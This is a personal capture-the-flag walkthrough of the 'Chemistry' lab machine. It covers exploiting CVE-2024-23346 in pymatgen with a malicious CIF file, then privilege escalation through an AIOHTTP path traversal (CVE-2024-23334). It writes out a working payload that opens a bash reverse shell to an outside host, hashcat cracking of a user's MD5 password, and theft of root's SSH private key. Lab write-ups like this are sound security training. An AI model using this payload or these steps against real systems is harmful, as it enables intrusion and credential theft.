# Chemistry labs walkthrough

Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the `pymatgen` (CVE-2024-23346) Python library by uploading a malicious `CIF` file to the hosted `CIF Analyzer` website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as `rosa` user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called `AioHTTP` (CVE-2024-23334) which is used on the web application running internally to read the root flag.

1. How many open TCP ports are listening on Chemistry?
nmap -sV -sC -Pn --disable-arp-ping 10.10.11.38 -p- -vvvvv
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Chemistry - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


we can see two ports open

2. What is the path of the example CIF file available in the dashboard?
at the login page I created an accoutn jack:jack allowing me access to the dashboard
View page source to get the answer
![CIFFile](<IMages\Screenshot 2025-03-17 181549.png>)


3. What is the 2024 CVE ID for a vulnerability related to parsing CIF files using a Python library?
Lets use the internet to look for this
https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0

4. What user the CIF Analyzer web application running as?
Using the link we found the following code
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

we will use this and adjust the touch pwned to ping "Host IP" to confirm this is working
We can now try and get a shell

data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.17/9001 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

we can now get the user "app"

5. What is the name of the sqlite database file used by the CIF analyzer web application?
ls to list directory 
see instance
cd instance
ls
see the file name

6. What is the rosa user's password on Chemistry?
opening the database file and we can see what looks like username:password hash so we have 
rosa63ed86ee9f624c7b14f1d4f43dc251a5'M

lets crack the md5 hash
hashcat -m 0 "63ed86ee9f624c7b14f1d4f43dc251a5" /usr/share/wordlists/rockyou.txt

removed 'M as this was after every hash and we get the following password
unicorniosrosados 

7. user flag
we now have password so lets ssh to rosa's account

8. What TCP port that is listneing only on the localhost interface and hosting a webserver?
lets run the following command to see what's listening on local host
upgraded shell using the following
![alt text](<IMages\image.png>)

netstat -tnlp
shows port 8080 open

9. What is the name of the server application hosting the internal website?
port forwarded using the following command
ssh -L 8888:127.0.0.1:8080 rosa@10.10.11.38

i can now run the website on my local machine allowing me to use burp
![alt text](<IMages\image1.png>)

I opened the browser in burp and went onto the webpage - chose the options and the only that worked was "list services", i chose this, forwarded the reqeuest and now know the answer is AIOHTTP/3.9.1, maybe we can priv esc

10. What version of AIOHTTP is running on TCP port 8080?
3.9.1

11. What is the 2024 CVE ID for a directory traversal vulnerability in AIOHTTP?
CVE-2024-23334

12. root flag
We can look at the source code and see static pages
![alt text](<IMages\image2.png>)
lets input that into burp into the get parameter and see what we get
![alt text](<IMages\image3.png>)

now we know that works, lets try and get to the root flag
I got a bit stuck so used some help, realised we needed to look for the ssh key in root then we can use that to ssh in and access root

after stealing the id_rsa by using 
![alt text](<IMages\image4.png>)
i need to change the permissions of the key to chmod 600 which i can then use to ssh onto the target with
ssh -i id_rsa root@*.*.*.* which gives me passwordless access to root and the final flag